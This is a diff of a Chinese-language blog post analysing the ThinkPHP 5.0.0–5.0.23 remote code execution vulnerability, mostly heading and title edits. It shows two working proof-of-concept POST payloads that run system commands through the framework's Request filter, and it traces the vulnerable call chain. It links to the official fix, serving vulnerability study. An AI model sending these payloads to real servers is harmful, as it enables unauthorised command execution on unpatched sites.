@@ -79,12 +79,12 @@
 
 
 
-<meta name="description" content="thinkphp RCE漏洞分析">
+<meta name="description" content="thinkphp5.0.0 ~ 5.0.23 RCE漏洞分析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="tps2">
+<meta property="og:title" content="thinkphp5.0.0 ~ 5.0.23 RCE">
 <meta property="og:url" content="http://yoursite.com/2020/05/12/tps2/index.html">
 <meta property="og:site_name" content="zww">
-<meta property="og:description" content="thinkphp RCE漏洞分析">
+<meta property="og:description" content="thinkphp5.0.0 ~ 5.0.23 RCE漏洞分析">
 <meta property="og:image" content="http://yoursite.com/2020/05/12/tps2/3.png">
 <meta property="og:image" content="http://yoursite.com/2020/05/12/tps2/5.png">
 <meta property="og:image" content="http://yoursite.com/2020/05/12/tps2/1.png">
@@ -98,7 +98,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/05/12/tps2/13.png">
 <meta property="og:image" content="http://yoursite.com/2020/05/12/tps2/11.png">
 <meta property="article:published_time" content="2020-05-12T02:43:10.000Z">
-<meta property="article:modified_time" content="2020-05-14T06:36:19.275Z">
+<meta property="article:modified_time" content="2020-05-14T06:41:52.023Z">
 <meta property="article:author" content="WenWei Zeng">
 <meta property="article:tag" content="PHP">
 <meta property="article:tag" content="thinkphp">
@@ -139,7 +139,7 @@
 
 
 
-  <title>tps2 | zww</title>
+  <title>thinkphp5.0.0 ~ 5.0.23 RCE | zww</title>
   
 
 
@@ -273,7 +273,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">tps2</h1>
+          <h1 class="post-title" itemprop="name headline">thinkphp5.0.0 ~ 5.0.23 RCE</h1>
         
 
         <div class="post-meta">
@@ -357,15 +357,15 @@
       
 
       
-        <p>thinkphp RCE漏洞分析</p>
+        <p>thinkphp5.0.0 ~ 5.0.23 RCE漏洞分析</p>
 <a id="more"></a>
 
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a href="https://www.wenweizeng.com/2019/12/14/tps/#more" target="_blank" rel="noopener">环境安装</a></p>
-<h2 id="thinkphp-RCE"><a href="#thinkphp-RCE" class="headerlink" title="thinkphp RCE"></a>thinkphp RCE</h2><h3 id="tp5-0-0-5-0-23"><a href="#tp5-0-0-5-0-23" class="headerlink" title="tp5.0.0 ~ 5.0.23"></a>tp5.0.0 ~ 5.0.23</h3><p>thinkphp 5.0.22完整版 PHP 5.5.38</p>
-<h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h4><p>payload:</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a href="https://www.wenweizeng.com/2019/12/14/tps/#more" target="_blank" rel="noopener">环境安装教程</a></p>
+<p>本次复现：thinkphp 5.0.22完整版 PHP 5.5.38</p>
+<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h2><p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8888&#x2F;cms&#x2F;tp5022&#x2F;public&#x2F;index.php?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br></pre></td></tr></table></figure>
 
-<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>先整体的看一下这个流程，tp程序从 App.php文件开始<br>在App.php中，首先会先实例化Request类的一个对象$request（这个很重要，后面会提到），接着会根据请求的URL调用routeCheck进行调度解析获得到$dispatch，之后将进入exec($dispatch, $config)根据$dispatch类型的不同来进行处理</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先整体的看一下这个流程，tp程序从 App.php文件开始<br>在App.php中，首先会先实例化Request类的一个对象$request（这个很重要，后面会提到），接着会根据请求的URL调用routeCheck进行调度解析获得到$dispatch，之后将进入exec($dispatch, $config)根据$dispatch类型的不同来进行处理</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 执行应用程序</span></span><br><span class="line"><span class="comment">* <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span>  Request $request 请求对象</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> Response</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(Request $request = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $request = is_null($request) ? Request::instance() : $request;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 获取应用调度信息</span></span><br><span class="line">        $dispatch = <span class="keyword">self</span>::$dispatch;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">            $dispatch = <span class="keyword">self</span>::routeCheck($request, $config);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">self</span>::exec($dispatch, $config);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (HttpResponseException $exception) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>跟进routeCheck-&gt;check，发现在check函数中调用了$request-&gt;method()来获取http请求的方法<br>同时这里也是poc利用的开始</p>
@@ -400,11 +400,11 @@
 
 <p>$filter通过$this-&gt;getFilter获得，而在__construct中$this-&gt;filter已经被设置为system<br><img src="/2020/05/12/tps2/8.png" alt></p>
 <p>最后回到input()，调用array_walk_recursive函数对$data中的每个元素应用$this-&gt;filterValue函数，传入的参数为$filter，来到触发rce的函数call_user_func<br><img src="/2020/05/12/tps2/7.png" alt></p>
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>poc的函数调用栈：<br><img src="/2020/05/12/tps2/9.png" alt></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>poc的函数调用栈：<br><img src="/2020/05/12/tps2/9.png" alt></p>
 <p>利用过程：<br>在routeCheck的过程中，通过check函数中调用的$request-&gt;method()，修改了当前的Request::instance实例中的成员变量get[]和filter[]，同时将method设置为get保证能够正常的进入Request::instance()-&gt;param()。<br>进入Request::instance()-&gt;param()后，继续进入Request::instance()-&gt;input()，input函数中调用了array_walk_recursive这个回调函数，最后在filterValue中完成了rce</p>
 <p>关键点：captcha注册了get的路由，Request::method()能够调用Request类的任意方法，Request::__construct构造函数可以对其成员变量进行覆盖</p>
 <p>rce：<br><img src="/2020/05/12/tps2/10.png" alt></p>
-<h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h4><p>payload:</p>
+<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h2><p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;thinkphp_5.0.22_with_extend&#x2F;public&#x2F;index.php?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;whoami</span><br></pre></td></tr></table></figure>
 
 <p>首先找到我们使用过的param函数，这里是rce的开始</p>
@@ -419,14 +419,14 @@
 <p>最后进入input()，那么这里传入的参数$data为传入的$_SERVER数组，$name为REQUEST_METHOD<br>input提取出data数组中name键对应的值重新赋值为data后，调用filterValue，完成rce</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val]; <span class="comment">// &lt;==</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 无输入数据，返回默认值</span></span><br><span class="line">                <span class="keyword">return</span> $default;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter); <span class="comment">// &lt;==</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>因此利用前面的__construct进行变量覆盖，可以通过传入server[REQUEST_METHOD]=whoami，使得在经过foreach循环后$data值为whoami，此后调用FilterValue，同样实现RCE:<br><img src="/2020/05/12/tps2/12.png" alt></p>
-<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>函数调用栈：<br><img src="/2020/05/12/tps2/13.png" alt></p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>函数调用栈：<br><img src="/2020/05/12/tps2/13.png" alt></p>
 <p>利用点实际上还是在 <strong>Request::method()能够调用Request类的任意方法</strong> 这个点上，而这个实际上是在checkRoute中完成了对Request成员变量的覆盖，所以这里只是换了一种进入input函数的方法，实际原理还是换汤不换药</p>
-<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>前面我们有说到熟悉的tp5的rce利用链：Request::input()-&gt;Request::filterValue()-&gt;call_user_func()</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>前面我们有说到熟悉的tp5的rce利用链：Request::input()-&gt;Request::filterValue()-&gt;call_user_func()</p>
 <p>input()函数通过其功能看是使用filter对输入data进行过滤</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 获取变量 支持过滤和默认值</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array         $data 数据源</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string|false  $name 字段名</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed         $default 默认值</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string|array  $filter 过滤函数</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br></pre></td></tr></table></figure>
 
 <p>那么在能够控制$filter的情况下，我们是不是可以寻找input的调用来变换payload<br><img src="/2020/05/12/tps2/11.png" alt></p>
-<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p><a href="https://blog.thinkphp.cn/910675" target="_blank" rel="noopener">官方修复</a></p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://blog.thinkphp.cn/910675" target="_blank" rel="noopener">官方修复</a></p>
 <h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><ul>
 <li><a href="https://xz.aliyun.com/t/3845#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-0</a></li>
 <li></li>
@@ -594,7 +594,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#thinkphp-RCE"><span class="nav-number">2.</span> <span class="nav-text">thinkphp RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tp5-0-0-5-0-23"><span class="nav-number">2.1.</span> <span class="nav-text">tp5.0.0 ~ 5.0.23</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#POC-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">POC-1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#分析"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#总结"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POC-2"><span class="nav-number">2.1.2.</span> <span class="nav-text">POC-2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结-1"><span class="nav-number">2.1.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思考"><span class="nav-number">2.2.</span> <span class="nav-text">思考</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修复"><span class="nav-number">2.2.1.</span> <span class="nav-text">修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考博客"><span class="nav-number">3.</span> <span class="nav-text">参考博客</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-1"><span class="nav-number">2.</span> <span class="nav-text">POC-1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">2.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-2"><span class="nav-number">3.</span> <span class="nav-text">POC-2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-1"><span class="nav-number">3.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思考"><span class="nav-number">4.</span> <span class="nav-text">思考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复"><span class="nav-number">5.</span> <span class="nav-text">修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考博客"><span class="nav-number">6.</span> <span class="nav-text">参考博客</span></a></li></ol></div>
             
 
           </div>
